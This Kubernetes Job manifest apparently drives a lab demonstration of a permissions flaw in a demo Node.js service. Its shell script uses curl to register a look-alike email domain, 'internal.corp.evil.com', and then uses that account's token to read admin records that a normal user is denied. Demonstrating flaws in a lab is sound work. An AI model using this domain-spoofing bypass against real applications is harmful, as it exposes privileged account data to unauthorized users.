# One-off Job: register crafted vendor email, then demonstrate admin table leak.
# Trigger with: make trigger (from nodejs/db-permissions-leak)
apiVersion: batch/v1
kind: Job
metadata:
  name: db-permissions-leak-trigger
spec:
  ttlSecondsAfterFinished: 600
  backoffLimit: 2
  template:
    metadata:
      labels:
        app: db-permissions-leak-trigger
    spec:
      restartPolicy: Never
      containers:
        - name: curl
          image: curlimages/curl:8.4.0
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              set -eu
              BASE="http://db-permissions-leak:8080"

              login() {
                curl -sS -X POST "$${BASE}/auth/login" \
                  -H "Content-Type: application/json" \
                  -d "$$1" \
                  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
              }

              expect_http() {
                code=$$(curl -sS -o /tmp/body -w '%{http_code}' -H "Authorization: Bearer $$1" "$$2")
                echo "HTTP $${code}"
                cat /tmp/body
                echo ""
                test "$${code}" = "$$3"
              }

              JACK_TOKEN=$$(login '{"email":"jack@example.com","password":"demo"}')

              echo "GET $${BASE}/api/users?table=vendor&email=jack@example.com (jack normal)"
              curl -sS -f -H "Authorization: Bearer $${JACK_TOKEN}" \
                "$${BASE}/api/users?table=vendor&email=jack@example.com"
              echo ""
              echo "GET $${BASE}/api/users?table=admins&email=root@internal.corp (jack blocked)"
              expect_http "$${JACK_TOKEN}" \
                "$${BASE}/api/users?table=admins&email=root@internal.corp" 403

              echo "POST $${BASE}/auth/register (look-alike domain)"
              curl -sS -f -X POST "$${BASE}/auth/register" \
                -H "Content-Type: application/json" \
                -d '{"email":"jack@internal.corp.evil.com","name":"Jack Vendor","password":"demo","department":"vendor"}' \
                || true
              echo ""

              CRAFTED_TOKEN=$$(login '{"email":"jack@internal.corp.evil.com","password":"demo"}')

              echo "GET $${BASE}/api/users?table=admins&email=root@internal.corp (crafted leak)"
              curl -sS -f -H "Authorization: Bearer $${CRAFTED_TOKEN}" \
                "$${BASE}/api/users?table=admins&email=root@internal.corp"
              echo ""
              echo "GET $${BASE}/api/admins?email=root@internal.corp (crafted /api/admins)"
              curl -sS -f -H "Authorization: Bearer $${CRAFTED_TOKEN}" \
                "$${BASE}/api/admins?email=root@internal.corp"
              echo ""
              echo "trigger succeeded"
